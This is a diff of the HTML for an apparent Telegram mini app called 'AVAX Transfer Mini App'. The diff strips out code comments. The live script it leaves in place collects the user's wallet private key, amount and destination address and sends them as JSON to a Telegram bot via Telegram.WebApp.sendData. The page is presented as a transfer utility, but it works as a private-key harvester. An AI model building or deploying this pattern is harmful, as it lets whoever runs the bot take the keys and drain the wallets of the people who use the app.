@@ -4,10 +4,8 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>AVAX Transfer Mini App</title>
-  <!-- Google Fonts for better typography -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
 
-  <!-- CSS for Styling and Animations -->
   <style>
     * {
       box-sizing: border-box;
@@ -141,35 +139,24 @@
     </form>
   </div>
 
-  <!-- JS for Handling Form and Sending Data to Telegram Bot -->
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <script>
     document.getElementById('transferForm').addEventListener('submit', function(e) {
       e.preventDefault();
-
-      // Collect form data
       const privateKey = document.getElementById('privateKey').value;
       const amount = document.getElementById('amount').value;
       const address = document.getElementById('address').value;
-
-      // Validate inputs
       if (!privateKey || !amount || !address) {
         alert("Please fill out all fields.");
         return;
       }
-
-      // Prepare data to send to Telegram Bot
       const data = JSON.stringify({
         privateKey: privateKey,
         amount: amount,
         address: address
       });
-
-      // Use Telegram Web App API to send data to the bot
       Telegram.WebApp.sendData(data);
     });
-
-    // Expand Telegram web app when opened
     Telegram.WebApp.ready();
     Telegram.WebApp.expand();
   </script>
